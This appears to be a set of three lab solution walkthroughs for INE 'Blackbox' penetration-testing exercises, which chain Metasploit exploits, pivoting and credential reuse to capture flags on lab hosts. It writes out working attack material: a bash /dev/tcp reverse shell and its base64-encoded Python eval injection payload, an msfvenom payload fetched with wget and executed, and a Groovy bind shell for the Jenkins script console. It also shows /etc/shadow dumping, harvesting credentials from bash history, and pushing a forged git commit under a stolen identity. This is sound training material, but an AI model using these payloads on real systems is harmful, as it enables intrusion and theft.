# BLACKBOX 1

Step 1: Open the lab link to access the Kali GUI instance.

![](../media/Blackbox%20lab%20INE_1.png)

Step 2: Check if the provided machine/domain is reachable.

Command

ping demo.ine.local

![](../media/Blackbox%20lab%20INE_2.png)

The provided machine is reachable, and we also found the target IP Address.

Step 3: Check open ports on the provided machine.

Command

nmap demo.ine.local

![](../media/Blackbox%20lab%20INE_3.png)

On the provided machine, ports 80 (HTTP), 3306 (MySQL) are open.

We will target port 80 to find the running application name and version to proceed further.

Step 4: Check the interfaces present on the Kali machine.

Command

ifconfig

![](../media/Blackbox%20lab%20INE_4.png)

There are two interfaces (excluding loopback interface) present on the machine i.e. eth0 and eth1.

In this case we are interested in eth1 interface IP Address range: 192.62.135.0/24

Note: The IP address will be different in your case, so make sure you use the correct IP address, otherwise the commands might not give the expected results!

Step 5: Running the nmap on port 80 to find all possible information about the target server.

Command

nmap -A -O -p 80 demo.ine.local

-A: Enable OS detection, version detection, script scanning, and traceroute

-O: Enable OS detection

-p: Port

![](../media/Blackbox%20lab%20INE_5.png)

Machine is running nginx 1.14.0 server on port 80 and V-CMS application is hosted on it.

Step 6: To know the version of V-CMS application, open Firefox browser and access the V-CMS app.

![](../media/Blackbox%20lab%20INE_6.png)

URL

[http://demo.ine.local](http://demo.ine.local)

![](../media/Blackbox%20lab%20INE_7.png)

The version 1.0 is mentioned in the footer.

Step 7: Search for publicly available exploit for this version of V-CMS.

![](../media/Blackbox%20lab%20INE_8.png)

We can observe that V-CMS v1.0 is vulnerable to PHP file upload and execution. Also, there is a metasploit module to exploit it.

![](../media/Blackbox%20lab%20INE_9.png)

We can use this module for exploitation.

Step 8: Start the Metasploit framework and search for the vcms module. Then, check all the vcms module available options.

Command

msfconsole -q

search vcms

use exploit/linux/http/vcms_upload

show options

![](../media/Blackbox%20lab%20INE_10.png)

We have found the vcms exploit module.

![](../media/Blackbox%20lab%20INE_11.png)

We can notice, that "TARGETURI" is set to /vcms/ path. We need to change that value to "/" because the v-cms application is present in the base address.

Set "RHOSTS" (or Remote Hosts) to demo.ine.local where the port 80 is exposed

Port 80 is by-default mentioned in the module, also php/meterpreter/reverse_tcp payload is set along with "LHOST" and "LPORT" (Local Machine IP Address and Port) for reverse connection of the meterpreter shell.

The LHOST IP Address which is by default mentioned is not valid. (10.1.0.3). We must replace it to appropriate address, "192.62.135.2" in this setup

Step 9: Set the target information and exploit the vcms application

Command

set RHOSTS demo.ine.local

set TARGETURI /

set LHOST 192.62.135.2

check

exploit

getuid

Note: The "check" command quickly verify that all the module settings and target is valid to exploit or not.

![](../media/Blackbox%20lab%20INE_12.png)

We have successfully exploited the v-cms using Metasploit framework and received a meterpreter session with the root privileges.

Step 10: Retrieve the first flag.

Command

ls /root

cat /root/flag.txt

![](../media/Blackbox%20lab%20INE_13.png)

FLAG

4f96a3e848d233d5af337c440e50fe3d

We have successfully exploited the first machine and retrieved the first flag.

Step 11: Check all the available interfaces on the compromised machine

Command

shell

ifconfig

![](../media/Blackbox%20lab%20INE_14.png)

Again, there are two interfaces (excluding loopback interface) present on the machine i.e. eth0 and eth1.

Ping the eth1 IP address from the Kali machine i.e 192.69.228.2

![](../media/Blackbox%20lab%20INE_15.png)

We can't access IP range 192.69.228.0/24 from the Kali machine. To access this network from Kali, we need perform pivoting.

Step 12: Use "autoroute" command to add route to unreachable IP range.

autoroute

This command is used to add meterpreter session specific routes to the Metasploit's routing table. These routes can be used to pivot to the otherwise unreachanble network.

Check help option for "autoroute" command.

Command

run autoroute -h

![](../media/Blackbox%20lab%20INE_16.png)

Add the route to IP range 192.69.228.0/24

![](../media/Blackbox%20lab%20INE_17.png)

Command

run autoroute -s 192.69.228.0 -n 255.255.255.0

Background the meterpreter session and check if the route is added successfully to the metasploit's routing table.

Command

background

route print

The route is added successfully. We could use the "route" command to add the routing table to the metasploit framework

Command

route add 192.69.228.0 255.255.255.0 1

Syntax:routeadd(make a new route)subnetnetmasksid(meterpreter session ID)

Step 13: We will run auxiliary TCP port scanning module to discover any available hosts (From IP .3 to .10). And, if any of ports 80, 8080, 445, 21 and 22 are open on those hosts.

Command

use auxiliary/scanner/portscan/tcp

set PORTS 80, 8080, 445, 21, 22

set RHOSTS 192.69.228.3-10

exploit

![](../media/Blackbox%20lab%20INE_18.png)

We have discovered one host i.e. 192.69.228.3. Ports 21 (FTP) and 22 (SSH) are open on this host.

Step 14: In the meterpreter session there is an utility "portfwd" which allows forwarding remote machine port to the local machine port. We want to target port 21 of that machine so we will forward remote port 21 to the local port 1234.

Interact with the meterpreter session and forward the remote port to local machine.

Check portfwd meterpreter command help option.

Command

session -i 1

portfwd -h

![](../media/Blackbox%20lab%20INE_19.png)

Forwarding the remote port to local port

Command

portfwd add -l 1234 -p 21 -r 192.69.228.3

portfwd list

-lLocal port

-pRemote port

-rRemote host

![](../media/Blackbox%20lab%20INE_20.png)

We have successfully forwarded the port. Now, scan the local port using Nmap.

Step 15: Running nmap on the forwarded local port to identify the service name.

Command

background

nmap -sS -sV -p 1234 localhost

![](../media/Blackbox%20lab%20INE_21.png)

We can observe from the results that host is running vsftpd (FTP) service.

Note: Sometimes scan can take a little bit longer than expected. Please be patient.

Step 16: Search for vsftpd exploit module

Command

search vsftpd

![](../media/Blackbox%20lab%20INE_22.png)

There is an exploit for vsftpd service in the Metasploit framework.

Step 17: Exploit the target host using vsftpd backdoor exploit module.

Command

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOSTS 192.69.228.3

exploit

id

![](../media/Blackbox%20lab%20INE_23.png)

Note: Sometimes, the exploit fails the first time. If that happens then please run the exploit again.

Command

exploit

![](../media/Blackbox%20lab%20INE_24.png)

Once the exploit is completed, we will get a session on host and can run commands on it.

Step 18: Retrieve the second flag.

Command

ls /root

cat /root/flag.txt

![](../media/Blackbox%20lab%20INE_25.png)

FLAG

58c7c29a8ab5e7c4c06256b954947f9a

We have exploited both machines and also recovered both flags!

BLACKBOX 2

Lab Environment

In this lab environment, the user is going to get access to a Kali GUI instance. A web server can be accessed using the tools installed on Kali on . However, there is another machine in the setup which is not accessible from the Kali machine but is accessible from the web server.

Objective: Compromise both machines to retrieve the flags!

Tools

The best tools for this lab are:

       -  dirb
       -  Metasploit Framework
       -  Proxychains
       -  A Web Browser
Please go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course, will dramatically reduce the benefits of a hands-on lab!

Solution

Step 1: Open the lab link to access the Kali GUI instance.

![](../media/Blackbox%20lab%20INE_26.png)

Step 2: Check if the provided machine/domain is reachable.

Command:

ping -c5 online-calc.com

![](../media/Blackbox%20lab%20INE_27.png)

The provided machine is reachable.

Step 3: Check open ports on the provided machine.

Command

nmap -sS -sV online-calc.com

![](../media/Blackbox%20lab%20INE_28.png)![](../media/Blackbox%20lab%20INE_29.png)

On the provided machine, ports 80, 5000 and 8000 are open.

       -  Apache web server is available on port 80.
       -  A Python-based web server is available on port 8000.
       -  The service available on port 5000 is not recognized by Nmap. And that's you can see the long string at the bottom of the port scan output. It's the fingerprint for that service. If you notice the output closely, it's the HTTP response returned by that service and it contains HTML content. So it must be some kind of webapp.
Open the browser and check the responses returned by these above 3 discovered services:

Port 80:

![](../media/Blackbox%20lab%20INE_30.png)

As expected, Apache is available on this port.

Port 5000:

![](../media/Blackbox%20lab%20INE_31.png)

A calc webapp is available on this port.

Port 8000:

![](../media/Blackbox%20lab%20INE_32.png)

On this port a Python-based HTTP service was available. The response is in JSON format. So this could be some kind of API.

Step 4: Performing directory enumeration on the exposed services using dirb tool.

Port 80:

Command

dirb http://online-calc.com

![](../media/Blackbox%20lab%20INE_33.png)

There's nothing interesting in the above output.

Port 5000:

Command

dirb http://online-calc.com:5000

![](../media/Blackbox%20lab%20INE_34.png)

There's nothing interesting in the above output.

Port 8000:

Command

dirb http://online-calc.com:8000

![](../media/Blackbox%20lab%20INE_35.png)

The above output does contain some interesting information. Notice that there are 2 exposed resources which look quite interesting from the perspective of a pentester:

       -  /.git/: Probably there are some more files in the exposed .git directory
       -  /console: This could give access to werkzeug's debugger console and give us an easy RCE!
Let's try to access/consoleand see if it provides unauthenticated access or not:

![](../media/Blackbox%20lab%20INE_36.png)

As you can see the console is locked and requires a PIN. Since the PIN is not known, and brute forcing it is not feasible, since Werkzeug only allows a few attempts after which !

Let's use dirb to explore files in the exposed/.gitfolder:

Command:

dirb http://online-calc.com/.git

![](../media/Blackbox%20lab%20INE_37.png)

Notice thatconfigandindexfiles are also exposed!

Step 5: Retrieving git config from the target machine.

Let's retrieve the git config and see if there's anything interesting in there:

Command:

curl http://online-calc.com:8000/.git/config

![](../media/Blackbox%20lab%20INE_38.png)![](../media/Blackbox%20lab%20INE_39.png)

Notice that the git config contains details including the credentials of a user named Jeremy McCarthy:

Email: jeremy@dummycorp.com Username: jeremy Password: diamonds

The git config file also contains the URL of the remote origin:

Remote Origin URL:

Step 6: Cloning the remote repository.

Use the following command to clone the remote repository:

Command:

git clone http://online-calc.com/projects/online-calc

![](../media/Blackbox%20lab%20INE_40.png)

Command:

ls

Notice that the git repository has been cloned successfully!

Checking the files present in the cloned repository:

Command:

cd online-calc/

ls

![](../media/Blackbox%20lab%20INE_41.png)

There are 2 files present in the cloned repository: - API.py - utils.py

Looks like this is the repository containing the code running on port 8000. This fact would be apparent as we make progress with our investigation of the repository in the following steps.

Step 7: Checking the git logs.

Let's check the git logs to get some more context on the cloned repository and see if anything interesting can be located in the commit history:

Command:

git log

![](../media/Blackbox%20lab%20INE_42.png)

Notice that the commit logs did contain some interesting information. Seems like there were 2 pressing issues with the code in this repository: - Arbitrary File Read - Remote Code Execution (RCE)

Both of the issues seem to be fixed in the subsequent commits.

Step 8: Checking the code changes made to fix the arbitrary file read vulnerability.

Use the following command to list the changes between the commit when the arbitrary file read vulnerability was fixed and the commit just before it:

Command:

git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd

![](../media/Blackbox%20lab%20INE_43.png)

Notice thatsend_from_directoryfunction is used to send any file requested from the root directory of the Flask server and if the requested path contains..or%2E, a404response is returned!

Step 9: Checking the code changes made to fix the RCE vulnerability.

Use the following command to list the changes between the commit when the RCE vulnerability was fixed and the commit just before it:

Command:

git diff 4bcfb590014321deb984237da2a319206975170f 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd

![](../media/Blackbox%20lab%20INE_44.png)

![](../media/Blackbox%20lab%20INE_45.png)

Notice that in order to fix the bug, a function namedisValidwas added to the code and in theevaluatefunction, theisValidfunction is called before the user-supplied data is passed to theevalfunction.

Also notice that the/character in the user input is being replaced by* 1.0 /in theevaluatefunction.

Step 10: Modify the code in the API.py and make it vulnerable to RCE again.

Open the API.py file in a text editor of your choice. We are using vim:

Command:

vim API.py

Now comment the input validation check before the call toeval:

![](../media/Blackbox%20lab%20INE_46.png)

Now commit these changes to the repository:

Commands:

git status

git add .

git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"

![](../media/Blackbox%20lab%20INE_47.png)

The above commands would commit the changes to the repository with the author name and email set to that of Jeremy McCarthy's.

Now let's push these changes to the remote repository:

Command:

git push

![](../media/Blackbox%20lab%20INE_48.png)

Upon running the above command, you would be asked for the credentials before making changes to the remote repository. If you remember, the git config we retrieved previously (in Step 5) had the credentials for the user named Jeremy McCarthy. Those credentials would work and the code should be pushed to the remote repository after successful authentication!

If you notice the output to the push command, you would see some commands being executed. Looks like the code is being updated in the webapp in real-time. That can be confirmed by pulling API.py from the Flask server:

Command:

curl http://online-calc.com:8000/API.py

![](../media/Blackbox%20lab%20INE_49.png)

![](../media/Blackbox%20lab%20INE_50.png)

Notice that the call toisValidfunction has been commented out. So the changes we pushed have been applied to the webapp in real-time, as we speculated!

Step 11: Preparing the exploit to get a reverse shell session on the target machine.

Checking the IP address of the provided Kali instance:

Command:

ip addr

![](../media/Blackbox%20lab%20INE_51.png)

Notice that there are 2 interfaces (excluding the loopback interface) on the provided Kali instance namely: eth0 and eth1.

The target machine () is on the same network as that of eth1. So we will use the IP of that interface in this exploit:192.196.85.2

Since the/characters in the user payload would be converted to* 1.0 /by theevaluatefunction, we will base64-encode the payload:

Command:

echo 'bash -c "bash -i >& /dev/tcp/192.196.85.2/4444 0>&1"' | base64

![](../media/Blackbox%20lab%20INE_52.png)

Note: Make sure you replace the IP in the above command with the IP of your Kali GUI instance. Otherwise the exploit wouldn't work!

Step 12: Exploiting the RCE to get a reverse shell.

Once the payload has been base64-encoded, start a netcat listener on one of the terminals of the provided Kali instance:

Command:

nc -lvp 4444

![](../media/Blackbox%20lab%20INE_53.png)

Copy the following payload:

Payload:

__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTk2Ljg1LjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")

![](../media/Blackbox%20lab%20INE_54.png)

Note: - Press CTRL+SHIFT+ALT in order to copy the payload to the clipboard of the Kali instance. - Make sure to replace the base64-encoded value in the above payload since the IP address of your Kali GUI instance might be different. If you copy the payload as is, chances are that it might not work due to the same reason.

The above payload decodes the base64 encoded payload we created in the previous step and passes it tobashfor executing the reverse shell payload. Since our payload will be executed by theevalfunction in Python, that's why we are importing Python'sosmodule to execute the desired commands.

Now paste the copied payload to the textbox in the calculator webapp and press the=button to supply the payload to the backend:

![](../media/Blackbox%20lab%20INE_55.png)

This should trigger the bug and get us the reverse shell! Once the payload has been supplied, check the terminal on which the netcat listener was started:

![](../media/Blackbox%20lab%20INE_56.png)

We've got a reverse shell session from the target machine!

Looks like we've got a root shell:

Command:

id

![](../media/Blackbox%20lab%20INE_57.png)

Step 13: Retrieving the flag from the target machine.

Let's find the flag from this machine:

Command:

find / -iname *flag* 2>/dev/null

![](../media/Blackbox%20lab%20INE_58.png)

Notice the very first entry of the output:/tmp/flag. This file contains the flag.

Let's read the flag:

![](../media/Blackbox%20lab%20INE_59.png)

Flag: 3b2b474c06380f696b38c1498f795e054374

Step 14: Generating payload to gain a meterpreter session on the compromised machine.

Even though we have compromised the target machine, we are still limited in the things we can do with the normal shell session. It would be quite good to gain a meterpreter shell session instead to carry out further exploitation.

Use the following command to generate areverse_tcppayload to get back a meterpreter shell session (an ELF binary):

Command:

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.196.85.2 LPORT=5555 -f elf > payload.bin

![](../media/Blackbox%20lab%20INE_60.png)

The payload is now ready and saved to the file namedpayload.bin.

Command:

file payload.bin

It's an 64-bit ELF binary, as indicated by the above command!

Step 15: Downloading the payload binary on the compromised target machine.

We will start a Python-based file server on the Kali instance and serve the generated payload binary:

Command:

python3 -m http.server 80

![](../media/Blackbox%20lab%20INE_61.png)

Now we can download the payload binary on the compromised target machine usingwgetutility on the reverse shell session we had gained in Step 12.

Commands:

wget http://192.196.85.2/payload.bin

file payload.bin

chmod +x payload.bin

![](../media/Blackbox%20lab%20INE_62.png)

The above commands download the payload binary from the Kali instance, check the file type (just confirming if the file is properly downloaded or got corrupted) and make it executable.

Note: If you check the Python-based file server, you can notice the request to download the payload file here as well:

![](../media/Blackbox%20lab%20INE_63.png)

This can become handy in case of blind exploitation scenarios where we can execute commands but cannot see the output.

Step 16: Gaining a meterpreter session on the target machine.

So by now everything is ready on the target machine. Now all we need to do is set up a multi handler on the Kali instance and gain the meterpreter session by executing the payload on the target machine.

Use the following commands to setup a multi handler on the Kali instance:

Commands:

msfconsole -q

use exploit/multi/handler

set PAYLOAD linux/x64/meterpreter/reverse_tcp

set LHOST 192.196.85.2

set LPORT 5555

run

![](../media/Blackbox%20lab%20INE_64.png)

The above set of commands would have started the metasploit framework and configured the options forexploit/multi/handlermodule: - The payload is set tolinux/x64/meterpreter/reverse_tcp(we generated this payload using msfvenom) - LHOST and LPORT are set to the same values we used for generating the payload via msfvenom.

Now the reverse TCP handler is running on the Kali instance, we can execute the payload binary on the compromised target machine:

Command:

./payload.bin

![](../media/Blackbox%20lab%20INE_65.png)

Check the terminal in which the reverse TCP handler was running:

![](../media/Blackbox%20lab%20INE_66.png)

Notice that we have received a meterpreter session! This will aid us to proceed with the exploitation.

Step 17: Checking the list of interfaces on the compromised target machine.

Command:

ifconfig

![](../media/Blackbox%20lab%20INE_67.png)

![](../media/Blackbox%20lab%20INE_68.png)

Notice that there are 2 interfaces (excluding the loopback interface) namely:eth0andeth1. And one of those is in the same network as the Kali machine. The other one is in another network.

Step 18: Using the meterpreter session to serve as a socks proxy.

As mentioned in the challenge description, the second machine to be exploited is accessible via the first machine (that is, ).

Now since we have access to the first target machine, we can easily access the second machine. But if there is some webapp running on that second machine, we can't access it directly, unless we have a proxy setup to relay the request via the compromised target. And that's what we will set up in this step!

Background the meterpreter session and check the meterpreter session identifier:

Command:

bg

sessions

![](../media/Blackbox%20lab%20INE_69.png)

Now add a route to the network accessible only via the first target machine at .

Command:

route add 192.108.156.0/24 1

The last argument to the above command is the identifier of the meterpreter shell session.

Now let's use thesocks_proxyauxiliary module to convert the meterpreter session to serve as a socks proxy:

Commands:

use auxiliary/server/socks_proxy

set VERSION 4a

set SRVPORT 9050

run -j

![](../media/Blackbox%20lab%20INE_70.png)

After the above commands, a socks proxy server (having version 4a) would be started on port 9050. It would be started as a background process (since we used the-jflag).

Now anything we sent over port 9050 would be sent over to the network we added to the route (that is,192.108.156.0/24).

Step 19: Scanning the second target machine using the proxychains tool.

Let's scan the second target machine (present in the network of the first compromised machine).

We will use proxychains to do the job. By default, proxychains makes use of port9050and that's the reason we configured the socks proxy server to listen on that port!

Command:

proxychains nmap -sT -P0 192.108.156.3

![](../media/Blackbox%20lab%20INE_71.png)

The above command would scan the second target machine using nmap. Since it's not directly reachable we have used proxychains tool, which would make use of the proxy server we started, using the meterpreter session to the compromised target machine (at ).

![](../media/Blackbox%20lab%20INE_72.png)

Notice that port8080is open on the second target machine.

Step 20: Configuring the browser to use the socks proxy server.

Let's try and access the service on port 8080 on the second target machine via browser. For that we have to configure the browser to make use of the socks proxy server that we started in Step 18.

Go to browser preferences:

![](../media/Blackbox%20lab%20INE_73.png)

Search for proxy keyword and select the Network Settings from the returned results:

![](../media/Blackbox%20lab%20INE_74.png)

Now configure the browser to use socks proxy as shown in the following image:

![](../media/Blackbox%20lab%20INE_75.png)

Step 21: Accessing the automation server on the second target machine.

Now since everything is configured, we can access the service running on port 8080 on the second target machine in the browser itself.

![](../media/Blackbox%20lab%20INE_76.png)

It's Jenkins web UI!

Important Note: The socks proxy server over meterpreter is quite unstable and it might get disconnected before you completely exploit the second machine. So you might have to gain back the meterpreter shell session on the first target machine (located at ) and set the proxy server again, in case the meterpreter session dies.

Click on Manage Jenkins link on the left panel:

![](../media/Blackbox%20lab%20INE_77.png)

Scroll down on Manage Jenkins page:

![](../media/Blackbox%20lab%20INE_78.png)

Click on Script Console section:

![](../media/Blackbox%20lab%20INE_79.png)

That should open the Groovy Script console:

![](../media/Blackbox%20lab%20INE_80.png)

Here we can execute arbitrary scripts and get a shell session! But since we are connected to the Jenkins instance over the socks proxy, we need to start a bind shell on that server and connect to it. The reverse shell won't work since that machine (on which Jenkins is running) doesn't know how to reach back to the Kali instance (which is located in a different network).

Let's do that next.

Step 22: Gaining a shell session on the second target machine (running Jenkins).

Paste the following Groovy bind shell payload in the script console and click on the Run button to execute the payload:

Groovy bind shell payload:

int port=5555;

String cmd="/bin/bash";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()

Socket s = new java.net.ServerSocket(port).accept()

InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();

OutputStream po=p.getOutputStream(),so=s.getOutputStream();

while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

![](../media/Blackbox%20lab%20INE_81.png)

Payload Reference:

Once the payload has been executed in the Groovy script console, we can use netcat utility to connect to the bind shell started on the target machine (running Jenkins) using proxychains:

Command:

proxychains nc -v 192.108.156.3 5555

![](../media/Blackbox%20lab%20INE_82.png)

And that should connect us to the target machine running Jenkins!

Step 23: Gathering information about the target machine running Jenkins.

Now we can issue some commands to find out more information about the user we are operating as and the target server machine:

Command:

id

![](../media/Blackbox%20lab%20INE_83.png)

We are currently running asjenkinsuser.

Let's get the listing of files:

Command:

ls

![](../media/Blackbox%20lab%20INE_84.png)

Let's get the process listing:

Command:

ps aux

![](../media/Blackbox%20lab%20INE_85.png)

As you can see we can issue commands on the Jenkins server as well.

And this completes our objective of compromising both machines and gaining shell access on them!

BLACKBOX 3

Step 1: Open the lab link to access the Kali GUI instance.

![](../media/Blackbox%20lab%20INE_86.png)

Step 2: Check if the provided machines/domains are reachable.

Commands:

ping -c 2 server1.ine.local

ping -c 2 server2.ine.local

ping -c 2 server3.ine.local

![](../media/Blackbox%20lab%20INE_87.png)

The provided machines are reachable, and we also found their IP addresses.

Step 3: Scan the network to discover the services running on them.

Now let's find all the services on the provided target machines:

Command:

nmap -sV --script=banner 192.73.96.0/24

The above command would fingerprint the services and provide their version information as well since we have used the-sVflag.

--script=banneris an Nmap script that will connect to an open TCP port and print out anything that is sent by the service within five seconds. That's that service banner.

![](../media/Blackbox%20lab%20INE_88.png)

![](../media/Blackbox%20lab%20INE_89.png)

We can observe that there are three machines in the subnet excluding the provided Kali instance and gateway.

       -  The first machine, having IP192.73.96.3is running the Werkzeug httpd service,
       -  The second machine, having IP192.73.96.4is running the MySQL server, and
       -  The third machine, having IP192.73.96.5is running OpenSSH and Apache Tomcat server.
Note: The IP addresses would be different in your case, so make sure you use the correct IP address, otherwise the commands might not give the expected results!

After running the Nmap banner script we would know the names and the versions of the services on all the provided machines.

And since we know of all the details now, we will begin with the exploitation part.

Let's first target theWerkzeug httpd 0.9.6service i.e .

Step 4: Exploiting Werkzeug httpd service.

We already know the version of Werkzeug. So let's use that information to search for any publicly available exploits using searchsploit.

Information: : searchsploit, a command line search tool for Exploit-DB that also allows you to take a copy of Exploit Database with you, everywhere you go. SearchSploit gives you the power to perform detailed off-line searches through your locally checked-out copy of the repository. This capability is particularly useful for security assessments on segregated or air-gapped networks without Internet access.

So using searchsploit, one can quickly look for exploits from the copy of the Exploit Database available offline on your machine (Kali instance in this case). Let's look for exploits available for werkzeug:

Command:

searchsploit werkzeug

![](../media/Blackbox%20lab%20INE_90.png)

We can notice that there is a Metasploit module for werkzeug. But we need to make sure that this exploit works against Werkzeug version 0.9.6.

The suggested ruby exploit is located at/usr/share/exploitdb/exploits/python/remote/37814.rb.

Inspect this file to determine if the current version of werkzeug is vulnerable to the "Debug Shell" command execution or not:

Command:

cat /usr/share/exploitdb/exploits/python/remote/37814.rb

![](../media/Blackbox%20lab%20INE_91.png)

As you can clearly see, Werkzeug version 0.9.6 is vulnerable to command execution.

Now that we have identified the running application and discovered the vulnerability, we will exploit it next.

Step 5: Searching for Werkzeug exploit modules in the Metasploit Framework.

Start Metasploit framework and search for werkzeug exploit modules:

Commands:

msfconsole -q

search werkzeug

The above set of commands would start metasploit in quiet mode (that is, we won't get a big banner) and then look for werkzeug related exploit modules.

![](../media/Blackbox%20lab%20INE_92.png)

Notice that there is a Metasploit module for Werkzeug. We will use this for exploitation in the subsequent steps.

Step 6: Checkingwerkzeug_debug_rcemodule options.

Let's use the identified werkzeug module:exploit/multi/http/werkzeug_debug_rceand list the options that we need to configure for this module.

Commands:

use exploit/multi/http/werkzeug_debug_rce

show options

![](../media/Blackbox%20lab%20INE_93.png)

The following options are to be set:

       -  RHOSTS: It's the IP or URL of the target machine. In our case, it's , where the werkzeug service is running.
       -  PORT: is set to 80 by default, for this module. Since the service is running on port 80 on the target machine, nothing needs to be done.
       -  PAYLOAD: Set it topython/meterpreter/reverse_tcpto get back the meterpreter shell session.
       -  LHOST: Set it to the IP address of the host machine (the Kali GUI instance), where we expect to receive back the meterpreter shell session, that is,192.73.96.2. But this IP might be different in your case, so make sure you set it properly. Otherwise the exploit won't work!
       -  LPORT: Set it to a port where we expect to receive back the meterpreter shell session. Let's keep it at it's default value.
Now that we know of all the options and the values we need to fill in, let's do that next.

Step 7: Configuring the selected werkzeug module and exploiting the application.

Use the following commands to configure the module and exploit the werkzeug application:

Commands:

set RHOSTS 192.73.96.3

set LHOST 192.73.96.2

check

exploit

Thecheckcommand would check if the service on the target is vulnerable to this exploit or not, instead of actually exploiting it. And theexploitcommand would exploit the service, provided that it's vulnerable.

![](../media/Blackbox%20lab%20INE_94.png)

Notice that the werkzeug application has been successfully exploited and we have received back a meterpreter shell.

Let's check the privilege of the meterpreter shell session:

Command:

getuid

![](../media/Blackbox%20lab%20INE_95.png)

As shown in the above output, we have root user privileges!

Now that we have gained a shell session on the target machine, the very first thing would be to look for the existing users, sensitive files/data like hardcoded credentials, etc. We can use popular scripts like LinEnum to quickly identify all possible information related to users and system configurations. This will greatly speed up the process and reduce the manual work that we need to otherwise perform.

We will choose to go with the manual route to show you the complete process but you can use LinEnum as well. It's already available in the Kali GUI instance.

Step 8: Checking available users on the target machine.

Since we are root, we can check the contents of/etc/shadowfile and find the list of all the users, their home directories and even their password hashes:

Command:

cat /etc/shadow

![](../media/Blackbox%20lab%20INE_96.png)

A total of seven users are present on the target machine.

We could now check their home directory to find interesting files or alternatively leverage interesting modules such aspost/linux/gather/enum_users_history.

Step 9: Using theenum_users_historyMetasploit post exploit module to find the user's history file.

Let's use the Linux user shell history enumeration module to find and dump the user's history.

Information: When a user enters any command in the terminal, by default it gets logged in the.bash_historyfile in the user's home directory. And that's one of the things that this module can retrieve for us!

As mentioned in the  description: Theenum_users_historymodule gathers user specific information. User list, bash history, mysql history, vim history, lastlog and sudoers.

Now let's background the meterpreter session and run theenum_users_historymodule:

Commands:

background

use post/linux/gather/enum_users_history

set SESSION 1

run

![](../media/Blackbox%20lab%20INE_97.png)

Notice that the shell history for the user auditor is available. The contents of that file have been downloaded to the Kali instance in the file:/root/.msf4/loot/20211117160325_default_192.73.96.3_linux.enum.users_287331.txt

Step 10: Hunting for sensitive information in the auditor user's bash history file.

Command:

cat /root/.msf4/loot/20211117160325_default_192.73.96.3_linux.enum.users_287331.txt

![](../media/Blackbox%20lab%20INE_98.png)

The auditor user had accessed a MySQL database server using CLI and the credentials were supplied to the command which were thus stored in the.bash_historyfile, in plain-text.

As if you remember, on  machine, MySQL server was running. And it's IP address was192.73.96.4! So we supposedly got the credentials to access the MySQL server.

Let's try connecting to that MySQL server instance next.

Step 11: Connecting to the MySQL server using discovered credentials.

Use the following command to connect to the MySQL server instance running on :

Command:

mysql -h server2.ine.local -u root -pfArFLP29UySm4bZj

![](../media/Blackbox%20lab%20INE_99.png)

That worked! We have received back a MySQL shell session where we can access (and even tamper with) all the data present on this database server!

Let's list all the databases and see if anything interesting is present on this server:

Command:

show databases;

![](../media/Blackbox%20lab%20INE_100.png)

All the three databases present are the default databases of MySQL server.

So there's nothing of much value here. But there's one thing we can do - we can try to exploit this database server and probably get shell access on that machine.

Let's try doing that next.

Step 12: Checking for MySQL exploit modules in the Metasploit Framework.

Let's switch back to the Metasploit Framework tab in the terminal and look for the available MySQL exploit modules:

Command:

search mysql

![](../media/Blackbox%20lab%20INE_101.png)

Notice that there is a Metasploit module available to exploit the MySQL database server. i.eexploit/multi/mysql/mysql_udf_payload

It's a MySQL UDF exploit which will create a User-Defined Function (UDF) and allow us to run arbitrary commands using it.

Step 13: Checking the available options for the MySQL UDF exploit module.

Let's use the listed MySQL UDF module and check it's available options:

Commands:

use exploit/multi/mysql/mysql_udf_payload

show options

![](../media/Blackbox%20lab%20INE_102.png)

The following options are to be set:

       -  FORCE_UDF_UPLOAD: Since we wish to execute commands on the remote server, we will set this option to true in order to install asys_exec()MySQL function.
       -  RHOSTS: It's the IP or URL of the target machine. In our case, it's , where the MySQL server is running.
       -  RPORT: It's the port of the MySQL service on the remote machine. Since MySQL service is running on the default port of 3306, nothing needs to be changed here.
       -  USERNAME: It's the username to be used for the MySQL server login. It is already set to the value we want, that is, root.
       -  PASSWORD: It's the password to be used for the MySQL server login. Since we retrieved the credentials for root user, we just need to set it to that value:fArFLP29UySm4bZj
We also need to configure the payload options and the exploit target for this module:

![](../media/Blackbox%20lab%20INE_103.png)

Here we need to set the following options:

       -  LHOST: Set it to the IP address of the host machine (the Kali GUI instance), where we expect to receive back the meterpreter shell session, that is,192.73.96.2. But this IP might be different in your case, so make sure you set it properly. Otherwise the exploit won't work!
       -  LPORT: Set it to a port where we expect to receive back the meterpreter shell session. Let's keep it at it's default value.
For the Exploit target, which defaults to Windows (numbered as 0), we need to change it to Linux (numbered as 1).

Now that we know of all the options and the values we need to fill in, let's do that next.

Step 14: Configuring the selected MySQL UDF exploit module and exploiting the target.

Let's set all the options as discussed in the previous step:

Commands:

set FORCE_UDF_UPLOAD true

set PASSWORD fArFLP29UySm4bZj

set RHOSTS server2.ine.local

set TARGET 1

set LHOST 192.73.96.2

exploit

session -i 2

![](../media/Blackbox%20lab%20INE_104.png)

Note: Again emphasising the point that the IP address for theLHOSTmust not be copied as is but instead it must be retrieved from the Kali instance that you receive. Otherwise things won't work as expected.

Ignore the error received while exploiting the MySQL server.

Let's check the available meterpreter sessions:

Command:

sessions

![](../media/Blackbox%20lab%20INE_105.png)

Notice that we received back a new meterpreter session. Let's access that shell (it's indexed as 2 in the above image):

Command:

sessions -i 2

![](../media/Blackbox%20lab%20INE_106.png)

And we have received back a meterpreter shell on the target running MySQL server! So the exploitation was successful.

Step 15: Reading the flag from the compromised MySQL server.

Commands:

ls /root

cat /root/flag.txt

![](../media/Blackbox%20lab%20INE_107.png)

